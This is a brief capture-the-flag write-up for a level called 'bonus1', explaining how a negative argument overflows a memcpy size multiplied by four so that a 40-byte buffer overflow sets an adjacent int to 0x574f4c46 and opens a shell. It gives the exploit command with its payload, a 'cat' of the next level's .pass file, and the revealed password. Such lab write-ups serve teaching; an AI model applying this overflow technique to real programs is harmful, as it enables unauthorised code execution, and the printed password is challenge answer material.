Okay so the binary is pretty explicit. We need to write the value `0x574f4c46` in our int. \
But to do so, we need to write after the 40 char buffer and we cannot insert a value superior to 9 or it will terminate. \
As the int we provide is mulitplied by 4 when passed in `memcpy`, we can basically make a value < 0 go above 0 by overflowing. \
We did some math:
```python
a = 44 - 2**32
# -4294967252
print(a / 4)
# -1073741813
```
We want to make our memcpy size 44 so we write 4 bytes after the buffer (which is our int), so we search for the overflowing value as if it was an int to unsigned cast which gives us the huge number which we divide by four so it overflows to 44.

Then we can pass a simple string to execute the shell:
```shell
$ ./bonus1 -1073741813 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
                                                    |_ the value we need the int to be equal to
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
